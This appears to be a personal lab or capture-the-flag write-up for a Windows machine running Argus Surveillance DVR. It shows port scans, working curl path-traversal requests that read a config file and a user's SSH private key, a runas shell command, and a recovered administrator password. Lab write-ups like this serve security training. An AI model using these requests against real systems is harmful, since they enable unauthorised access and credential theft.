Windows ttl=125

# rustscan

```
PORT      STATE SERVICE      REASON
22/tcp    open  ssh          syn-ack ttl 125
135/tcp   open  msrpc        syn-ack ttl 125
139/tcp   open  netbios-ssn  syn-ack ttl 125
445/tcp   open  microsoft-ds syn-ack ttl 125
5040/tcp  open  unknown      syn-ack ttl 125
8080/tcp  open  http-proxy   syn-ack ttl 125
49664/tcp open  unknown      syn-ack ttl 125
49665/tcp open  unknown      syn-ack ttl 125
49666/tcp open  unknown      syn-ack ttl 125
49667/tcp open  unknown      syn-ack ttl 125
49668/tcp open  unknown      syn-ack ttl 125
49669/tcp open  unknown      syn-ack ttl 125
```

# nmap

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
8080/tcp open  http-proxy
|_http-title: Argus Surveillance DVR
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/20%Time=667453BB%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive\r\
SF:nKeep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r\nC
SF:ontent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x20Su
SF:rveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-Type
SF:\"\x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name=\"
SF:GENERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.pys
SF:oft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no\"\
SF:x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"Top\"
SF:\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Camera
SF:sTopFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x20\r
SF:\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20scrol
SF:ling=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwidth
SF:=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTable\
SF:"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Camer
SF:asBottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x
SF:20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\x20
SF:frames,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p>\r
SF:\n\x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\r\n
SF:Connection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nCon
SF:tent-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEA
SF:D>\r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\
SF:x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=ISO-8
SF:859-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawing\
SF:x206\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<fra
SF:meset\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x
SF:20\x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"auto\"
SF:\x20noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x20m
SF:arginheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x
SF:20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"ActiveXI
SF:Frame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<f
SF:rame\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"auto\
SF:"\x20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0\"\
SF:x20marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x2
SF:0<p>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doesn'
SF:t\x20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-06-20T16:10:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

# rabbit hole

got this exploit and thought we need to find hash from LFI and it will give us some pass

https://www.exploit-db.com/exploits/50130

https://pentest-tools.com/vulnerabilities-exploits/argus-surveillance-dvr-4000-local-file-inclusion_2866

```
curl 'http://192.168.216.179:8080//WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus+Surveillance+DVR%2FDVRParams.ini'
```

but no luck!!

# initial

then looked at hint on offsec portal!

> [!NOTE]
> There is a webserver with an LFI vulnerability. The local user "viewer" has an SSH key in the usual location

then look at this

![[Pasted image 20240620223723.png]]

```
curl 'http://192.168.216.179:8080//WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa'  
```

and bingo got `id_rsa` and get initial access!!

# priv esc

checked this randomly `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`

got admin hash and tried rabbit hole exploit and get creds

```
runas /user:Administrator C:\tmp\shell.exe
```

```
14WatchD0g$
```